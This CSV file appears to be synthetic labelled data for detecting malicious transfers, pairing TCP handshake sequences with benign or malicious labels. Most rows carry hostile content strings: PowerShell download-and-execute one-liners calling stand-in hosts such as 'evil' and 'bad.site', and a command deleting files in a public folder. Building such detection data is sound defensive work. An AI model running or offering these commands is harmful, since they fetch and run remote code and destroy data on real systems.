trace_id,sequence,valid,description,category,content
9044fcea3ce128a9.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
b844070de8f74062.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
fce74b9a0aaab4dc.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
ae38d29c88d05665.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
eb01236a2a982a70.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
9a88f78515271d5b.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
2c8b6b0497ac12ab.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b850a40c49a859c0.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
fd244d54c913f855.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
654cc1b271f1fd2e.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
85b0d9b862a8faff.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
83972101ac6f80c2.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
9d8df85f6afa8e91.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
2c1fc2785d28ca3f.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
430c7c0a11333d4e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
9384dbd160864935.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
91f0aacaf3306964.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
2a053f32b1d48539.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
c612bc677b5c502c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
3ee56397fcfde364.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
c2288b56bec8f88f.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
f3887457c3279fce.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
a1926f87c94e706c.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
a84c087174debb18.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
497b01ec8bd3db01.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
00c5240f41d311ed.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
31b819774e2d58d6.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
8040a5c9fca77cc5.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
ba63c68a780f9cf3.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
769b372eeb56fcbd.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
64c6fee840ed98e3.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
2de6f802400d6673.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
7b8ac3e780c1730b.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
eef39f13e6373599.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
488ab8c89509c494.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
13094cae02c8e2a7.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
aef3ea5153a96478.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
da72f467aec4307b.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
11e36cc05771e8a9.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
41b5f5ebfe6dea33.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
ff3132312a5074a7.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
223dcaee57a6d414.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
c2ecfab7af13011d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
4359020e18052f17.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
9b03f2fbfd7852e6.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
99fff9d5a8e3fc08.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b8cf8d8d3fe30d36.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
85fdb737ac1cacae.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
45add26a1868ac12.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
529e9483fd41e7b0.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
d51c140a66b56ccb.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
3658b9599f7532ab.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
0edef898c9cb41d3.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
3716939e1978d6cb.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
ceb2c665262a1de8.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
0b6a3dc1f3841f8f.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
4a2254691a0f7724.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
49bbb0f054f6f200.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5037a8d0571538bd.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
f0bde205bba6a074.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
dc0a3ba629352a9d.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
3db1065c09e317c8.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
54237a6d4885551c.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
909c9424d569e3b9.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
79ba5a7a70056da5.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
302070fae736a234.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
1f2861a49566455f.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
480977beeb4baa80.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
a8d36f4d340e1009.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
b5ea82ed3271f5b4.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
ab9079882dfcbcd7.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
c5cdfce20d4d866f.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
04ad47fc0eb974fb.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
39f443a944e3114c.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
1a37cb801510810c.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4d0a30b447973e88.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
6c5881955c63a766.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
16765310f4489ee5.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
ea04844ea4be16eb.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
92c6ac4104475885.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
ed6018064304e2af.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
ec255908f8828fe7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
69df4166f03247f9.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5dd566d349a0718d.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
5498518c6646fe1f.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
9c9ab16f3a94bde1.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
1fa3bb9680b457aa.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
81924664fc9cd880.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
a33df98087d6c586.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
f73a3412c2136920.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
dfaefd0d4d9ae4b5.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c20847352ed2103a.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
fa437d31c734102e.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
7380af19cef7bbad.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
a85e06c203c91aae.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
3d20c6c9c5b9d4a1.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
e0819d950bc2e162.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
f9889210ed894d5d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
ef121a5407012898.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
e1e981cdfad10c2b.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
ef0155dfa125f37f.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
463046a6d4263478.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2f6a389de60e0d8c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
88eb4a832efcf67e.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
c15e416586f7d7f4.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
0079ec1be1596ab0.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
8b0aac4b7524fcba.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
36c183620196fe0c.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
62f2d689f90ce89b.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
ff02f90cb7450986.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
f16416999902ec30.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
beb3b6c06e970f59.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
e7488dba2505615e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
95fcef893bc1e067.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5618423d88e3e78b.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
ccd886f017cf9e04.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
da07d99b2b968c52.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
6b9d5476bab137c2.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
89853ae76e12fe0f.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
fb8683086bfd0a9a.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
81552d75d8021824.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
4dbf26375897ee25.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
9e784ba34d9b50d9.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b05ebf74483aefbd.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
270923f826d1e5d3.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
e51ed393eb1bf52b.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
d1333b6083f7e0b4.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
3180633c89fcee8e.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
bd488dc543095306.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
472527399d720ea1.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
9336e7a87e759b9f.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
08f4775630dfd81e.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
06a428dd5a543e67.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
5fa341acdfa78ade.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
97998bbc6939eba3.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
6421615384050ccb.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
db9661cead3a77c3.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
c5db6221126c5ff6.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
0391a7024032362a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
d362ae0b6022f4d2.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
7c518a57af282c33.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
a14d01581cfdcf3b.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
d51980eb22350062.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
16b0957a90385be9.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
7cb4408ca006ef2d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
24d8fcea1d796025.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e2e27a6ef9fd02bf.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5ac2fa6aae7c7314.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
04cd8c5b1d061204.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
35da97b2a683a92c.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
789c690995fda3fe.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e19135f755d99248.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
f66dcfa019724962.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
f766d2acee6a1cca.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
07b4cae0f6e23cbd.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
c7bb46186331797b.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
e8dc4deabf8ebad1.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5c259eb68b516650.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
03fd8fbbdbd053bb.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
4bb49f7056cbb508.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
39c25de18abaccdf.txt,SYN|SYN-ACK|ACK|DATA|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,User guide: usage instructions and notes.
9ea73bf6edb72913.txt,SYN|SYN-ACK|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Changelog: fixed bugs and improved docs.
4f6c2e9843a374b0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
cb87fb4c4945e726.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
b4f6d2dcf4640067.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5fea3241e2e2c323.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
a99e5fef8c2c166a.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,"Lorem ipsum dolor sit amet, consectetur adipiscing elit."
1f95ff5c4468e0a6.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Configuration: key=value pairs; no executable content.
3d7a64bae09655c7.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
9ae0acb0e21e6bb7.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
0602459939d6a8fb.txt,SYN|SYN-ACK|ACK|FIN|ACK,true,Synthetic valid handshake for benign filename,Derived Benign,Readme: This is a harmless text file.
d2119d56a918031d.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
e604b11abc3e62dd.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
a4bc3b6f927e2486.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
